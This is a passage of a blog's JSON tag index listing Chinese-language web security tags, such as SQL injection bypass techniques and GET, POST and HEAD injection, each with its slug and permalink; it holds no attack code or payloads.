E6%B3%A8/"},{"name":"SQL注入绕过姿势","slug":"SQL注入绕过姿势","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"},{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"},{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"},{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"},{"name":"web前端安全基础","slug":"web前端安全基础","permalink":"http://wxnsoul.github.io/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"web通信原理","slug":"web通信原理","permalink":"http://wxnsoul.github.io/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"}]}